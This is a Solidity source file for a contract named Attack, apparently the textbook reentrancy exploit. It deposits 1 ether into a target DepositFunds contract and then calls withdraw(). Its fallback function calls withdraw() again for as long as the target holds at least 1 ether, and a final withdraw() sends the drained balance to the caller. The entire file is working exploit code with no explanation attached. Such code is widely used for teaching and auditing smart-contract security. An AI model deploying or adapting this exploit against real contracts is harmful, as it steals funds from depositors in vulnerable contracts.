// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.11;

interface DepositFunds {
    function deposit() external payable;
    function withdraw() external;
}


contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function withdraw() public {
        payable(msg.sender).transfer(balance());
    }

}

